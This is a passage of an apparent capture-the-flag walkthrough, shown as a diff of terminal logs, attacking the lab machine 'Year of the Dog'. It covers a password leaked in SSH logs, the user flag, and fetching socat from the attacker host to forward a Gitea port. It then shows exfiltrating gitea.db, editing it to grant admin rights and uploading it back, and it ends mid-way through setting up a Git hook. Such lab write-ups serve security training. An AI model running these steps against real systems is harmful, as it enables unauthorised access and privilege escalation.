@@ -173,3 +173,178 @@ veth9e12dc0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         RX packets 0  bytes 0 (0.0 B)
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 19  bytes 1522 (1.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+www-data@year-of-the-dog:/var/www/html$ cd /home
+cd /home
+www-data@year-of-the-dog:/home$ ls
+ls
+dylan
+www-data@year-of-the-dog:/home$ cd dylan
+cd dylan
+www-data@year-of-the-dog:/home/dylan$ ls
+ls
+user.txt  work_analysis
+www-data@year-of-the-dog:/home/dylan$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@year-of-the-dog:/home/dylan$ cat work_analysis
+cat work_analysis
+Sep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]
+Sep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]
+www-data@year-of-the-dog:/home/dylan$ grep "dylan" work_analysis
+grep "dylan" work_analysis
+Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
+Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
+Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh dylan@10.10.8.29                              
+dylan@10.10.8.29's password: Labr4d0rs4L1f3
+
+	__   __                       __   _   _            ____              
+	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
+	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
+	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
+	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
+	                                                                |___/ 
+
+dylan@year-of-the-dog:~$ id
+uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
+dylan@year-of-the-dog:~$ ls
+user.txt  work_analysis
+dylan@year-of-the-dog:~$ cat user.txt 
+THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
+
+dylan@year-of-the-dog:~$ ifconfig
+docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet6 fe80::42:c9ff:feba:acb  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:c9:ba:0a:cb  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5  bytes 446 (446.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
+        inet 10.10.8.29  netmask 255.255.0.0  broadcast 10.10.255.255
+        inet6 fe80::4e:10ff:fe9a:c053  prefixlen 64  scopeid 0x20<link>
+        ether 02:4e:10:9a:c0:53  txqueuelen 1000  (Ethernet)
+        RX packets 55000  bytes 3328316 (3.3 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 54986  bytes 3280462 (3.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 124  bytes 10610 (10.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 124  bytes 10610 (10.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+veth9e12dc0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::6c37:e3ff:fe79:450e  prefixlen 64  scopeid 0x20<link>
+        ether 6e:37:e3:79:45:0e  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 19  bytes 1522 (1.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+dylan@year-of-the-dog:~$ ss -tulwn
+Netid     State       Recv-Q      Send-Q              Local Address:Port            Peer Address:Port      
+icmp6     UNCONN      0           0                          *%eth0:58                         *:*         
+udp       UNCONN      0           0                   127.0.0.53%lo:53                   0.0.0.0:*         
+udp       UNCONN      0           0                 10.10.8.29%eth0:68                   0.0.0.0:*         
+tcp       LISTEN      0           80                      127.0.0.1:3306                 0.0.0.0:*         
+tcp       LISTEN      0           128                 127.0.0.53%lo:53                   0.0.0.0:*         
+tcp       LISTEN      0           128                       0.0.0.0:22                   0.0.0.0:*         
+tcp       LISTEN      0           128                     127.0.0.1:3000                 0.0.0.0:*         
+tcp       LISTEN      0           128                     127.0.0.1:45345                0.0.0.0:*         
+tcp       LISTEN      0           128                             *:80                         *:*         
+tcp       LISTEN      0           128                          [::]:22                      [::]:*  
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.8.29 - - [27/Jun/2023 12:05:47] "GET /socat HTTP/1.1" 200 -
+
+ylan@year-of-the-dog:~$ cd /tmp
+dylan@year-of-the-dog:/tmp$ ls
+systemd-private-077f5650c48a4fe38d1d59f7fb42caee-apache2.service-DCc14N
+systemd-private-077f5650c48a4fe38d1d59f7fb42caee-systemd-resolved.service-wMk0BO
+systemd-private-077f5650c48a4fe38d1d59f7fb42caee-systemd-timesyncd.service-Ug23q0
+dylan@year-of-the-dog:/tmp$ wget http://10.8.19.103:1234/socat
+--  http://10.8.19.103:1234/socat
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 375176 (366K) [application/octet-stream]
+Saving to: ‘socat’
+
+socat                      100%[=======================================>] 366.38K   239KB/s    in 1.5s    
+
+(239 KB/s) - ‘socat’ saved [375176/375176]
+
+dylan@year-of-the-dog:/tmp$ chmod +x socat
+dylan@year-of-the-dog:/tmp$ ./socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &
+[1] 1683
+http://10.10.8.29:8080/
+
+register a new acc
+
+dylan@year-of-the-dog:/tmp$ cd /gitea
+dylan@year-of-the-dog:/gitea$ ls
+git  gitea  ssh
+dylan@year-of-the-dog:/gitea$ cd gitea/
+dylan@year-of-the-dog:/gitea/gitea$ ls
+attachments  avatars  conf  gitea.db  indexers  log  queues  sessions
+dylan@year-of-the-dog:/gitea/gitea$ sqlite3 gitea.db
+
+Command 'sqlite3' not found, but can be installed with:
+
+apt install sqlite3
+Please ask your administrator.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ scp dylan@10.10.8.29:/gitea/gitea/gitea.db .
+dylan@10.10.8.29's password: 
+gitea.db               100% 1184KB 180.0KB/s   00:06 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlite3 gitea.db 
+SQLite version 3.40.1 
+Enter ".help" for usage hints.
+sqlite> select * from user;
+1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0
+2|witty|witty||witty@gmail.com|0|enabled|2916d09404c275fbd39c4ff012b1a770003eade826874f2c2b06e538f483811c0f74867c64ca9934d0f5c95165a52bd420c9|argon2|0|0|0||0|||RDdggIj1tj|vOfpqoDOY9|en-US||1687882490|1687882490|1687882490|0|-1|1|0|0|0|0|1|0|eb1716e12e7ae420e2b0382d087df433|witty@gmail.com|0|0|0|0|0|0|0|0|0||gitea|0
+sqlite> select lower_name, is_admin from user;
+dylan|1
+witty|0
+sqlite> UPDATE user SET is_admin=1 WHERE lower_name="witty";
+sqlite> select lower_name, is_admin from user;
+dylan|1
+witty|1
+sqlite> .quit
+┌──(witty㉿kali)-[~/Downloads]
+└─$ scp /home/witty/Downloads/gitea.db dylan@10.10.217.23:/gitea/gitea/gitea.db
+dylan@10.10.217.23's password: 
+gitea.db                                              100% 1184KB 208.9KB/s   00:05  
+
+update page and now we have admin privileges
+
+create a new repository and http://10.10.217.23:8080/witty/testing/settings/hooks/git/pre-receive
+
+#!/bin/sh
+#
+```
+```text
+# An example hook script to make use of push options.
+```
+```text
+# The example simply echoes all push options that start with 'echoback='
+```
+```text
+# and rejects all pushes when the "reject" push option is used.
+#
+```
